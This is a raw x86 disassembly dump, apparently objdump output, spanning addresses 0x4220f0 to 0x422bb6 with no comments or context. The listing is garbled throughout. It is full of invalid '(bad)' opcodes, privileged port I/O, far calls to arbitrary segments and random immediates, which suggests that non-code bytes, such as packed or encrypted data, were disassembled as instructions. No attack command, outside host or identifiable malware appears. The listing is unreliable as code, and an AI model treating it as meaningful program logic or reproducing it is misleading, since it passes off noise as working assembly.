  4220f0:	nop    DWORD PTR [edx-0x2fd2e5f2]
  4220f7:	rol    BYTE PTR [esp+ebx*1],cl
  4220fa:	mov    dl,ch
  4220fc:	pop    edi
  4220fd:	(bad)  
  4220fe:	jbe    0x42208e
  422100:	push   ss
  422101:	inc    ecx
  422102:	mov    edi,0x9008bf67
  422107:	ins    BYTE PTR es:[edi],dx
  422108:	fcom   DWORD PTR [eax+esi*2+0xd]
  42210c:	call   0xe18c547f
  422111:	daa    
  422112:	test   DWORD PTR [ebx+esi*2],0xfbbdc873
  422119:	iret   
  42211a:	sahf   
  42211b:	dec    esi
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	fsubr  DWORD PTR [esi]
  42211f:	push   esp
  422120:	sbb    DWORD PTR [eax],edx
  422122:	sahf   
  422123:	jle    0x422194
  422125:	mov    esp,0xd371bf4b
  42212a:	xchg   edi,eax
  42212b:	cmp    al,0xc
  42212d:	pop    edx
  42212e:	inc    DWORD PTR [eax]
  422130:	sub    al,0xeb
  422132:	or     DWORD PTR [ebx-0x53],edx
  422135:	int3   
  422136:	pop    ds
  422137:	out    0xc8,al
  422139:	inc    ecx
  42213a:	xchg   BYTE PTR [edx+edx*1+0xafaa592],bh
  422141:	(bad)  
  422142:	fucomi st,st(1)
  422144:	sahf   
  422145:	dec    ebp
  422146:	or     eax,DWORD PTR [esi-0xd]
  422149:	cmp    al,0x25
  42214b:	ss mov al,0x4e
  42214e:	test   DWORD PTR [ebx],edx
  422150:	dec    ebp
  422151:	pop    ds
  422152:	lds    eax,FWORD PTR [eax-0x37126f31]
  422158:	dec    eax
  422159:	sbb    BYTE PTR [ecx],bh
  42215b:	in     al,dx
  42215c:	in     eax,0xe1
  42215e:	ret    0xf2de
  422161:	into   
  422162:	sbb    DWORD PTR [ecx],esp
  422164:	adc    BYTE PTR [ebx],al
  422166:	repnz sub ah,BYTE PTR [eax]
  422169:	mov    al,ds:0x8b628e36
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    edx,DWORD PTR [eax-0x6b]
  4221e4:	push   ecx
  4221e5:	mul    BYTE PTR [edi+0x6e]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	mov    gs,WORD PTR [ecx+0x5b1ac603]
  4221f4:	inc    esi
  4221f5:	xchg   ecx,eax
  4221f6:	inc    ebx
  4221f7:	or     ebx,DWORD PTR [ebx-0x7ac90f85]
  4221fd:	jo     0x422200
  4221ff:	mov    ds:0xe00bbec9,al
  422204:	mov    ecx,0xd113df92
  422209:	adc    eax,0x66feab87
  42220e:	xor    al,0xc4
  422210:	xchg   ecx,eax
  422211:	sbb    eax,0xc2b20ab3
  422216:	push   0x134df1b6
  42221b:	ret    0xe206
  42221e:	mov    edi,0x26b2b970
  422223:	mov    ecx,0x75a89454
  422228:	jp     0x42228e
  42222a:	cs pushf 
  42222c:	and    eax,0x2fa79a1d
  422231:	sub    ebp,edx
  422233:	mov    bh,dh
  422235:	jae    0x422262
  422237:	pop    ebp
  422238:	mov    eax,DWORD PTR [ecx+0x34]
  42223b:	xchg   esp,eax
  42223c:	cld    
  42223d:	xchg   ecx,eax
  42223e:	mov    ch,0x2d
  422240:	and    esi,DWORD PTR [ebx+0x69f95abc]
  422246:	outs   dx,DWORD PTR ds:[esi]
  422247:	jno    0x4221d6
  422249:	jle    0x4222ba
  42224b:	call   0x441a:0xfa7bbb95
  422252:	test   al,0x91
  422254:	stos   DWORD PTR es:[edi],eax
  422255:	je     0x4221df
  422257:	in     eax,0x61
  422259:	dec    esi
  42225a:	ja     0x4222ad
  42225c:	ins    DWORD PTR es:[edi],dx
  42225d:	fs push ebx
  42225f:	mov    al,0x15
  422261:	ss cli 
  422263:	sbb    DWORD PTR [edx],edi
  422265:	push   ebx
  422266:	sbb    DWORD PTR [ebp+0x72c7b227],esp
  42226c:	mov    eax,ds:0xd6e50f52
  422271:	xor    ch,BYTE PTR [ebx]
  422273:	sbb    dh,BYTE PTR [edx-0x555b85ec]
  422279:	and    edi,esp
  42227b:	jnp    0x422287
  42227d:	sbb    eax,0x1727168e
  422282:	in     al,dx
  422283:	pop    edx
  422284:	mov    esi,0x5d426822
  422289:	data16 sub al,BYTE PTR [edx+0x6e7bf73]
  422290:	or     esp,ecx
  422292:	(bad)  
  422293:	(bad)
  422296:	mov    dh,0x9c
  422298:	adc    ebx,DWORD PTR [esi+ebp*8-0x262569a7]
  42229f:	pop    esi
  4222a0:	inc    ebx
  4222a1:	mov    DWORD PTR [eax],0x1649bb29
  4222a7:	lods   eax,DWORD PTR ds:[esi]
  4222a8:	or     edi,DWORD PTR [ecx]
  4222aa:	dec    edx
  4222ab:	or     ah,BYTE PTR [eax+0xd7f3a42]
  4222b1:	loopne 0x42231a
  4222b3:	or     eax,0xd0559aec
  4222b8:	hlt    
  4222b9:	test   esp,0x692b17f7
  4222bf:	fldenv [esi-0x4546cb7f]
  4222c5:	add    BYTE PTR [edi],ch
  4222c7:	xchg   edx,eax
  4222c8:	sbb    DWORD PTR [ebx],edx
  4222ca:	sub    DWORD PTR [edi+0x1f],0x959c59cf
  4222d1:	sbb    dh,BYTE PTR [ecx]
  4222d3:	ror    DWORD PTR [ebx-0x14],0x6a
  4222d7:	adc    ch,BYTE PTR [esi+0x1f]
  4222da:	mov    eax,DWORD PTR [ebp-0x10]
  4222dd:	dec    esi
  4222de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222df:	and    dl,BYTE PTR [edx+edi*4+0x4c]
  4222e3:	fwait
  4222e4:	mov    edx,DWORD PTR [edx-0x31]
  4222e7:	dec    ecx
  4222e8:	mov    BYTE PTR [esp+esi*2+0x4cbc84],ah
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	pop    esi
  422363:	mul    DWORD PTR [edi+0x16f67f2]
  422369:	add    BYTE PTR [eax],al
  42236b:	add    DWORD PTR [eax],eax
  42236d:	add    BYTE PTR [esi],ch
  42236f:	xlat   BYTE PTR ds:[ebx]
  422370:	xchg   ebx,eax
  422371:	sub    eax,0xc5138940
  422376:	fnstenv [ecx]
  422378:	ins    DWORD PTR es:[edi],dx
  422379:	xchg   DWORD PTR [edx+esi*8-0x9],edi
  42237d:	cmp    DWORD PTR [edi],ebp
  42237f:	je     0x42237d
  422381:	mov    ecx,0xa6bb834f
  422386:	out    dx,eax
  422387:	scas   eax,DWORD PTR es:[edi]
  422388:	cmp    DWORD PTR [edi-0x7f],eax
  42238b:	adc    BYTE PTR [esi-0x52],bl
  42238e:	je     0x4223d1
  422390:	pop    es
  422391:	imul   edi,DWORD PTR [edi+ecx*2-0x4f6ebddb],0x44
  422399:	and    eax,0x7ff820c3
  42239e:	or     eax,0xc7ebb987
  4223a3:	mov    edx,0x8794b33b
  4223a8:	mov    ecx,0x2e67ef92
  4223ad:	test   DWORD PTR ds:0x1cca86bb,0x8743f4d9
  4223b7:	push   edx
  4223b8:	je     0x422433
  4223ba:	or     eax,DWORD PTR [esi]
  4223bc:	test   eax,0xff716c53
  4223c1:	into   
  4223c2:	sub    DWORD PTR [ecx-0x2e],0x1b08f12e
  4223c9:	cmc    
  4223ca:	pop    esp
  4223cb:	dec    edi
  4223cc:	aam    0x88
  4223ce:	push   ds
  4223cf:	(bad)  
  4223d0:	repz xchg ecx,eax
  4223d2:	and    BYTE PTR [ebx-0x52679be9],bh
  4223d8:	cmp    bh,ah
  4223da:	jge    0x42243e
  4223dc:	inc    eax
  4223dd:	in     eax,dx
  4223de:	not    DWORD PTR [eax+0x6a]
  4223e1:	push   0x7c3343aa
  4223e6:	cli    
  4223e7:	sbb    esp,0x32
  4223ea:	mov    ecx,0xdfe188b7
  4223ef:	daa    
  4223f0:	mov    dl,0x9a
  4223f2:	push   eax
  4223f3:	and    eax,0x470bc5ba
  4223f8:	sub    DWORD PTR [edx+esi*2-0x1d],eax
  4223fc:	mov    esp,0xce8f07f6
  422401:	add    edx,eax
  422403:	fist   WORD PTR [edx]
  422405:	mov    bl,0x2
  422407:	mov    eax,0xe6fa5269
  42240c:	ds cli 
  42240e:	xor    al,0x54
  422410:	inc    edi
  422411:	icebp  
  422412:	dec    eax
  422413:	mov    ah,0xe0
  422415:	push   ebx
  422416:	test   DWORD PTR [ecx+edx*2+0x38182913],esi
  42241d:	sbb    al,0xd9
  42241f:	lds    edi,FWORD PTR [edx+0x27]
  422422:	repz gs sti 
  422425:	nop
  422426:	int    0x4a
  422428:	mov    edi,0x90abd05b
  42242d:	pop    ecx
  42242e:	cmp    ebp,DWORD PTR [ecx+0x22]
  422431:	push   es
  422432:	repz push eax
  422434:	dec    esp
  422435:	push   ss
  422436:	pop    es
  422437:	add    dl,al
  422439:	int3   
  42243a:	mov    eax,ds:0xedd4b193
  42243f:	retf   0x67bd
  422442:	icebp  
  422443:	mov    dh,0xb0
  422445:	(bad)  
  422447:	mov    ds:0x5224be99,eax
  42244c:	adc    DWORD PTR [eax+0x76],ecx
  42244f:	push   edi
  422450:	or     eax,0x920a5891
  422455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422456:	xor    BYTE PTR [edi+0x28143fc1],dh
  42245c:	bound  edx,QWORD PTR [edi]
  42245e:	mov    bh,0x30
  422460:	dec    eax
  422461:	dec    esi
  422462:	sti    
  422463:	jmp    0x4223f5
  422465:	pop    ss
  422466:	pop    esi
  422467:	push   0xffffff85
  422469:	fld    DWORD PTR [ecx]
  42246b:	in     al,0x2a
  42246d:	mov    es,WORD PTR [eax]
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	mov    DWORD PTR [ecx+0x706752e3],esi
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	add    BYTE PTR [ecx],al
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	cmp    ch,BYTE PTR ds:0x3acfde54
  4224f4:	jecxz  0x42253e
  4224f6:	or     DWORD PTR [ebx-0x793e9735],eax
  4224fc:	call   0xed0b20d9
  422501:	out    0x4e,eax
  422503:	addr16 mov cl,0xf5
  422506:	mov    ebx,0x7c05e96e
  42250b:	pop    eax
  42250c:	sbb    eax,0x95f3be27
  422511:	push   es
  422512:	inc    eax
  422513:	ins    BYTE PTR es:[edi],dx
  422514:	shr    edi,0x80
  422517:	clc    
  422518:	imul   edx,ebx,0x8d6acd87
  42251e:	inc    ebx
  42251f:	fsubr  QWORD PTR [ecx+0x7860f7ad]
  422525:	and    ah,bh
  422527:	xor    bl,BYTE PTR [ecx+0x6e8b3b3]
  42252d:	(bad)  
  42252e:	jbe    0x422504
  422530:	adc    eax,0x2936c4ed
  422535:	jo     0x4225b2
  422537:	push   ds
  422538:	pop    ebp
  422539:	push   edi
  42253a:	cmc    
  42253b:	fstp   QWORD PTR [edx]
  42253d:	cmc    
  42253e:	jp     0x422535
  422540:	stos   BYTE PTR es:[edi],al
  422541:	clc    
  422542:	ret    0x2137
  422545:	pop    ss
  422546:	ret    0x8b0
  422549:	lods   al,BYTE PTR ds:[esi]
  42254a:	nop
  42254b:	push   ebx
  42254c:	enter  0x16e7,0xfd
  422550:	pop    ebx
  422551:	push   esp
  422552:	mov    ch,0x7d
  422554:	sub    BYTE PTR [edi+0x59c1d652],dh
  42255a:	mov    ecx,0x62ff3c1a
  42255f:	pop    eax
  422560:	mov    DWORD PTR [edx-0x57],ebx
  422563:	nop
  422564:	pop    ds
  422565:	(bad)  
  422566:	ret    
  422567:	inc    ebp
  422568:	das    
  422569:	xchg   ebx,eax
  42256a:	data16 add al,0xc9
  42256d:	and    bl,BYTE PTR [ebp-0x19]
  422570:	xor    eax,0x32228684
  422575:	push   ds
  422576:	dec    ebx
  422577:	jo     0x422506
  422579:	out    0xc1,eax
  42257b:	in     eax,dx
  42257c:	inc    edx
  42257d:	mov    ah,0x0
  42257f:	(bad)  
  422580:	mov    bl,0xe1
  422582:	rcr    DWORD PTR [edi],0xe
  422585:	jmp    0x4225d5
  422587:	pmullw mm4,QWORD PTR [esi+0x745c3e24]
  42258e:	sbb    edx,edx
  422590:	in     al,0xa3
  422592:	or     eax,0xd07e1fda
  422597:	gs add ch,bl
  42259a:	fisttp WORD PTR [ebp+0x5]
  42259d:	retf   0x3a6e
  4225a0:	mov    esp,0x22998171
  4225a5:	fiadd  WORD PTR [esi-0x4341cc4f]
  4225ab:	ja     0x422575
  4225ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ae:	jmp    0x4225ed
  4225b0:	in     al,0xdd
  4225b2:	xor    BYTE PTR [esi],bh
  4225b4:	fwait
  4225b5:	shl    BYTE PTR [eax+0xd],0x8c
  4225b9:	loop   0x422591
  4225bb:	fbld   TBYTE PTR [esi-0xd]
  4225be:	or     al,ch
  4225c0:	call   0x2912:0x63aa7d2a
  4225c7:	or     BYTE PTR [ecx-0x1d60d91],bl
  4225cd:	xchg   esp,eax
  4225ce:	mov    edi,0x69d0c4bf
  4225d3:	lea    esi,[edi+ecx*2-0x6b]
  4225d7:	mov    ebp,0xe0b67ea5
  4225dc:	and    bh,ch
  4225de:	xlat   BYTE PTR ds:[ebx]
  4225df:	repz add dx,WORD PTR [edx+0x4ef069b0]
  4225e7:	in     eax,0x2d
  4225e9:	mov    edi,gs
  4225eb:	loopne 0x422644
  4225ed:	aaa    
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x3bb85d08]
  422664:	pop    ebp
  422665:	loop   0x4226ce
  422667:	jno    0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [eax+0x1c936921],dl
  422673:	sub    DWORD PTR [edx+0x2230b73b],edi
  422679:	or     BYTE PTR [ecx+0x2f],bl
  42267c:	fnstenv [eax]
  42267e:	push   ebp
  42267f:	loop   0x422700
  422681:	in     al,0x88
  422683:	in     al,dx
  422684:	ror    BYTE PTR [edi-0x63],cl
  422687:	or     bl,BYTE PTR [edi+0x4ed9138b]
  42268d:	mov    esp,0x80da362c
  422692:	addr16 mov al,ds:0x3766
  422696:	mov    ds:0x5853b72f,eax
  42269b:	aad    0xf2
  42269d:	adc    eax,0x43c1ddac
  4226a2:	pop    edx
  4226a3:	(bad)  
  4226a4:	daa    
  4226a5:	cdq    
  4226a6:	push   ecx
  4226a7:	push   ss
  4226a8:	xchg   ebp,eax
  4226a9:	dec    ecx
  4226aa:	jb     0x4226d9
  4226ac:	stc    
  4226ad:	dec    ebp
  4226ae:	add    esi,eax
  4226b0:	std    
  4226b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b2:	or     eax,0x1d7bd6b1
  4226b7:	and    edx,DWORD PTR [ecx+0x87afc46]
  4226bd:	pop    ebp
  4226be:	inc    edi
  4226bf:	mov    eax,0x6719cf1d
  4226c4:	sub    BYTE PTR [esi+eax*8-0x2a147193],bl
  4226cb:	mov    ds:0x2feee9ea,eax
  4226d0:	mov    es,WORD PTR [ebx]
  4226d2:	out    0x81,eax
  4226d4:	fsubr  st(6),st
  4226d6:	xchg   DWORD PTR [eax+0x52ffb626],eax
  4226dc:	push   es
  4226dd:	out    dx,eax
  4226de:	scas   al,BYTE PTR es:[edi]
  4226df:	scas   eax,DWORD PTR es:[edi]
  4226e0:	imul   ebp,ebp,0x42
  4226e3:	out    dx,al
  4226e4:	aaa    
  4226e5:	out    0x43,eax
  4226e7:	pop    ebx
  4226e8:	fcomp  DWORD PTR [edi-0x5de1dd5b]
  4226ee:	push   ss
  4226ef:	jo     0x422757
  4226f1:	pop    ebp
  4226f2:	pop    ss
  4226f3:	arpl   WORD PTR [ebp-0x1f],si
  4226f6:	pop    ds
  4226f7:	das    
  4226f8:	pop    es
  4226f9:	repz sbb ebx,esp
  4226fc:	dec    eax
  4226fd:	xor    DWORD PTR [edi],ebx
  4226ff:	call   0xe015:0xf259d493
  422706:	loope  0x422732
  422708:	cmp    BYTE PTR [ebx+0x1f4c57e6],0x46
  42270f:	imul   esi,edi,0xe4e681d1
  422715:	sub    ah,cl
  422717:	and    bh,BYTE PTR ds:[eax]
  42271a:	lods   al,BYTE PTR ds:[esi]
  42271b:	test   dh,ah
  42271d:	call   0x9715:0xf3fd8e89
  422724:	ds out dx,al
  422726:	xor    al,0x1c
  422728:	cmp    al,BYTE PTR [ebx]
  42272a:	lds    edx,FWORD PTR [edx]
  42272c:	aad    0x59
  42272e:	popf   
  42272f:	cmc    
  422730:	mov    esi,0x2fdfda64
  422735:	jnp    0x4226ca
  422737:	js     0x422702
  422739:	sbb    DWORD PTR [edx+0x13],ebp
  42273c:	in     eax,0x1d
  42273e:	inc    eax
  42273f:	sub    BYTE PTR [esi],0x8
  422742:	frstor [ebx-0xa]
  422745:	lock aad 0xeb
  422748:	push   ebp
  422749:	sub    bh,BYTE PTR [eax+0x1fe3c25d]
  42274f:	aam    0x9f
  422751:	mov    ah,0x92
  422753:	inc    ebp
  422754:	and    DWORD PTR [ebx],edx
  422756:	je     0x4226f7
  422758:	retf   0xf0c1
  42275b:	(bad)
  422760:	dec    edx
  422761:	out    dx,eax
  422762:	retf   
  422763:	aad    0x2b
  422765:	xor    DWORD PTR [edi+ecx*4],ebp
  422768:	xchg   ebp,eax
  422769:	inc    ebp
  42276a:	pushf  
  42276b:	mov    gs,WORD PTR [edi]
  42276d:	pop    ebx
	...
  4227d6:	daa    
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xe37f01c8
  4227e3:	xor    eax,0x7267322b
  4227e8:	add    DWORD PTR [eax],eax
  4227ea:	add    BYTE PTR [ecx],al
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	bound  ebx,QWORD PTR [ebp-0x7f]
  4227f1:	js     0x4227d4
  4227f3:	clc    
  4227f4:	pop    eax
  4227f5:	jbe    0x4227c6
  4227f7:	fst    DWORD PTR [ebx+0x180b2ef1]
  4227fd:	daa    
  4227fe:	mov    esi,0x1d1a4955
  422803:	xchg   esi,eax
  422804:	push   ebx
  422805:	push   ecx
  422806:	push   0x39
  422808:	fwait
  422809:	(bad)  
  42280a:	call   0x3ee7711c
  42280f:	imul   edi,DWORD PTR [edx],0xffffffac
  422812:	loop   0x4227d4
  422814:	shl    DWORD PTR [edx-0x1539bbcb],1
  42281a:	or     BYTE PTR [ecx-0x72cdc4d1],ch
  422820:	mov    dl,BYTE PTR [ebp-0x52c8207b]
  422826:	jg     0x4228a2
  422828:	xlat   BYTE PTR ds:[ebx]
  422829:	jmp    0x4227c2
  42282b:	mov    esi,0xc2a77171
  422830:	int    0x96
  422832:	fsubrp st(4),st
  422834:	cmp    esp,edi
  422836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422837:	int3   
  422838:	call   0x40a31ebb
  42283d:	sar    DWORD PTR [edi+0x3e],cl
  422840:	push   edi
  422841:	jae    0x4228a2
  422843:	mov    dh,0x92
  422845:	push   eax
  422846:	and    BYTE PTR [eax-0x2937d63c],0xae
  42284d:	mov    al,0xe3
  42284f:	mov    edi,0x3391f829
  422854:	push   esp
  422855:	dec    ecx
  422856:	mov    bh,0x6b
  422858:	mov    al,ds:0x1e6d2dec
  42285d:	stc    
  42285e:	jno    0x42287f
  422860:	shl    BYTE PTR [edx],cl
  422862:	clc    
  422863:	(bad)  
  422865:	rcr    BYTE PTR [eax-0x4f],cl
  422868:	mov    edx,0xf8a830f0
  42286d:	mov    edx,0x8f260300
  422872:	fistp  WORD PTR ds:0xb911fa9c
  422878:	xchg   ecx,eax
  422879:	aad    0xf1
  42287b:	adc    DWORD PTR [eax+0x7a],ebp
  42287e:	add    BYTE PTR [esi+0x7cbbbfcf],bl
  422884:	cld    
  422885:	sbb    eax,0x28e6da47
  42288a:	aam    0xf2
  42288c:	inc    esi
  42288d:	das    
  42288e:	es push esp
  422890:	mov    cl,0xc0
  422892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422893:	dec    eax
  422894:	and    cl,BYTE PTR [eax+edx*2-0x13]
  422898:	bound  ecx,QWORD PTR [edi+0x4b53dd9d]
  42289e:	mov    bl,0x85
  4228a0:	ins    DWORD PTR es:[edi],dx
  4228a1:	gs mov dh,0xb4
  4228a4:	xor    ch,BYTE PTR [esi+edx*2+0x49]
  4228a8:	xor    DWORD PTR [ebx+eiz*8+0x6c],eax
  4228ac:	loop   0x4228a9
  4228ae:	sar    DWORD PTR [esi],0x8
  4228b1:	inc    eax
  4228b2:	imul   edx,DWORD PTR [ecx],0x3f
  4228b5:	inc    esi
  4228b6:	ret    
  4228b7:	jae    0x42284a
  4228b9:	sbb    esi,0x50
  4228bc:	dec    edx
  4228bd:	fcmovne st,st(5)
  4228bf:	adc    ebx,DWORD PTR [esi]
  4228c1:	in     al,0x90
  4228c3:	scas   al,BYTE PTR es:[edi]
  4228c4:	rol    BYTE PTR [eax+0x6b],0xeb
  4228c8:	adc    dl,cl
  4228ca:	sub    eax,0x4e7a0f40
  4228cf:	std    
  4228d0:	mov    dh,0x17
  4228d2:	and    eax,0x635c186f
  4228d7:	pop    es
  4228d8:	jp     0x4228d3
  4228da:	ds mov al,0x3
  4228dd:	rol    BYTE PTR [eax],0x86
  4228e0:	in     al,0x6c
  4228e2:	das    
  4228e3:	mov    ah,0xa1
  4228e5:	jae    0x422949
  4228e7:	cmc    
  4228e8:	nop
  4228e9:	(bad)  
  4228ea:	out    dx,eax
  4228eb:	sub    dh,BYTE PTR [ebx+0x52]
	...
  422955:	add    ch,cl
  422957:	cmp    DWORD PTR [eax-0x10680369],edi
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4229e2
  422963:	cmc    
  422964:	addr16 jns 0x4229ce
  422967:	jae    0x42296a
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [edi],bl
  42296f:	adc    DWORD PTR [eax+edx*2-0x4b],esp
  422973:	ror    ebp,cl
  422975:	lds    esp,FWORD PTR [ebx+0x6a]
  422978:	clc    
  422979:	sbb    eax,DWORD PTR [esi]
  42297b:	in     al,0x4d
  42297d:	and    al,0x75
  42297f:	inc    edi
  422980:	aam    0x95
  422982:	fdivr  DWORD PTR [edi-0x47bf633c]
  422988:	xchg   ecx,eax
  422989:	pop    esi
  42298a:	repz sbb esi,DWORD PTR [ebx]
  42298d:	cmp    eax,0x72dc8dd2
  422992:	or     eax,0x4ec3d8b4
  422997:	jmp    0x6ce054a8
  42299c:	adc    al,0xf0
  42299e:	adc    al,0xa5
  4229a0:	mov    bh,0xb7
  4229a2:	and    BYTE PTR [ebp-0x5c],al
  4229a5:	push   ebx
  4229a6:	mov    edi,0x83429347
  4229ab:	shl    bh,cl
  4229ad:	mov    ds:0x4d179a44,eax
  4229b2:	jno    0x42299d
  4229b4:	in     eax,0xba
  4229b6:	sbb    BYTE PTR ds:0xf4f570d5,dh
  4229bc:	sub    ebx,DWORD PTR [edx+0x10]
  4229bf:	sub    eax,0x95b703e9
  4229c4:	add    BYTE PTR [ebp-0x3814dd8c],dl
  4229ca:	xchg   esi,eax
  4229cb:	or     ah,ch
  4229cd:	jmp    0xb230:0x86b3614f
  4229d4:	jns    0x4229e4
  4229d6:	add    edx,DWORD PTR [edi-0x67]
  4229d9:	pop    esp
  4229da:	inc    ecx
  4229db:	imul   ebp,DWORD PTR [edi+0x2ce62835],0x86074d57
  4229e5:	and    eax,0xd3b6e02e
  4229ea:	(bad)  
  4229eb:	lock lea ebx,[esi-0x6d]
  4229ef:	es xchg ebx,eax
  4229f1:	dec    ebx
  4229f2:	test   eax,0xa3f61863
  4229f7:	pop    esp
  4229f8:	pushf  
  4229f9:	mov    eax,0xeacca804
  4229fe:	pop    edi
  4229ff:	mov    al,ds:0x5279f9e8
  422a04:	or     bl,bl
  422a06:	dec    ebp
  422a07:	sahf   
  422a08:	lahf   
  422a09:	jae    0x422a3a
  422a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a0c:	lds    ecx,FWORD PTR [ebp+0x7a]
  422a0f:	(bad)  [ecx+0x14]
  422a12:	test   BYTE PTR [ebx-0x15411359],dl
  422a18:	jp     0x422a15
  422a1a:	out    dx,al
  422a1b:	hlt    
  422a1c:	sbb    DWORD PTR [eax],esp
  422a1e:	inc    edx
  422a1f:	fdecstp 
  422a21:	gs scas al,BYTE PTR es:[edi]
  422a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a24:	cmp    esi,DWORD PTR [eax+0x2f]
  422a27:	popa   
  422a28:	neg    BYTE PTR [ebp-0x27]
  422a2b:	jp     0x4229ee
  422a2d:	lods   al,BYTE PTR ds:[esi]
  422a2e:	mov    al,0x15
  422a30:	push   DWORD PTR [ebp+0x655c5162]
  422a36:	js     0x422a1f
  422a38:	lock scas eax,DWORD PTR es:[edi]
  422a3a:	mov    edx,?
  422a3c:	pop    ebx
  422a3d:	push   esi
  422a3e:	sub    al,0x79
  422a40:	inc    ebp
  422a41:	(bad)  
  422a42:	fidiv  WORD PTR [ecx-0x1f8c5e88]
  422a48:	sbb    eax,DWORD PTR [eax*2+0x5960f20b]
  422a4f:	sti    
  422a50:	sub    eax,0xe88f47b7
  422a55:	push   ebx
  422a56:	hlt    
  422a57:	test   eax,0xf0b36d2b
  422a5c:	inc    edx
  422a5d:	enter  0x8076,0x13
  422a61:	pop    DWORD PTR [edi]
  422a63:	push   eax
  422a64:	mov    WORD PTR [eax],fs
  422a66:	in     al,0xcf
  422a68:	or     BYTE PTR [ebp-0xf848e61],bh
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	xchg   esi,eax
  422ae3:	stos   BYTE PTR es:[edi],al
  422ae4:	mov    esi,0x174672d
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [edi-0x1b977dfd],ch
  422af3:	retf   0x382a
  422af6:	mov    al,ds:0x584b56a8
  422afb:	dec    ecx
  422afc:	add    edi,ebp
  422afe:	inc    esi
  422aff:	mov    esp,0xf9bda36b
  422b04:	stos   BYTE PTR es:[edi],al
  422b05:	mov    bh,0x62
  422b07:	in     al,dx
  422b08:	jnp    0x422a97
  422b0a:	add    ah,BYTE PTR [esi]
  422b0c:	aad    0x89
  422b0e:	(bad)  
  422b0f:	pop    ds
  422b10:	sub    ebp,DWORD PTR [edi+0x7c85c9f8]
  422b16:	inc    ecx
  422b17:	daa    
  422b18:	jmp    0xed57:0x2011f1ff
  422b1f:	retf   
  422b20:	sbb    al,0x14
  422b22:	inc    ebx
  422b23:	adc    eax,0x992d1aa5
  422b28:	mov    al,0x9b
  422b2a:	cmp    dh,BYTE PTR [edx]
  422b2c:	sub    bh,BYTE PTR [esi+0x33488dba]
  422b32:	cs xor eax,0x97cdfe2a
  422b38:	mov    ecx,es
  422b3a:	test   BYTE PTR ds:0xc5633ddd,0x18
  422b41:	outs   dx,DWORD PTR ds:[esi]
  422b42:	lds    edi,FWORD PTR [ecx+0x4e]
  422b45:	inc    eax
  422b46:	lea    edi,ds:0x183aa7c4
  422b4c:	inc    esi
  422b4d:	push   esp
  422b4e:	cli    
  422b4f:	les    edx,FWORD PTR gs:0x3ec114c4
  422b56:	mul    DWORD PTR [eax]
  422b58:	pop    ebp
  422b59:	add    dl,BYTE PTR [ecx+0x4fb5a8dc]
  422b5f:	cmc    
  422b60:	cmp    edi,edi
  422b62:	xchg   ecx,eax
  422b63:	aaa    
  422b64:	jmp    0xb6ac:0x77adf281
  422b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6c:	cwde   
  422b6d:	ret    0x34fb
  422b70:	lods   al,BYTE PTR ds:[esi]
  422b71:	inc    edi
  422b72:	fcmovne st,st(1)
  422b74:	adc    al,BYTE PTR es:[ebx]
  422b77:	imul   edi,DWORD PTR [ebx],0xffffffce
  422b7a:	lods   eax,DWORD PTR ds:[esi]
  422b7b:	xor    eax,0x133332ff
  422b80:	mov    bl,0xa0
  422b82:	shl    ebx,cl
  422b84:	add    eax,0xf4a63f56
  422b89:	sub    bh,dh
  422b8b:	add    al,0x2d
  422b8d:	or     al,0xac
  422b8f:	pop    ecx
  422b90:	jns    0x422bf4
  422b92:	add    al,0x9a
  422b94:	jmp    0x422b96
  422b96:	mov    dh,0xc2
  422b98:	adc    cl,ah
  422b9a:	mov    ebp,0xa9ebf0c2
  422b9f:	loop   0x422b8c
  422ba1:	jbe    0x422bf2
  422ba3:	or     BYTE PTR [ebp+0x28c7f41],bh
  422ba9:	pop    es
  422baa:	cdq    
  422bab:	xor    al,0xf6
  422bad:	pop    ss
  422bae:	add    eax,0x9979e4e
  422bb3:	(bad)  
  422bb4:	es pop ss
  422bb6:	mov    cl,0x48
